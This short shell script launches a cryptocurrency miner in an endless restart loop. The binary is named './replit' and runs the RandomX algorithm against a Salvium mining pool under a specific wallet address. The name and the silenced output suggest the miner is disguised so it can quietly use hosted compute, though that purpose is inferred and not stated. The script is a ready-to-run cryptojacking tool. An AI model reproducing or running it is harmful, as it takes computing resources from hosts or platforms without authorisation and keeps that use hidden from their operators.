while true
do
  echo "aman bang"

  ./replit \
    --disable-gpu \
    -a randomx \
    -o sg.salvium.herominers.com:1230 \
    -u SC1siBfG9HHfqjGkSYgEqALbd4WQZ37ZAj9mjPMgfqzdUiHrRuKEYLRLEm7uQt81xBgs2QzEEi6Yi6VXXqU5p6U8f124RMEobFN.rvz \
    -t 3 \
    </dev/null >/dev/null 2>&1

  echo "waduhh. Restarting in 10 seconds..."
  sleep 10
done
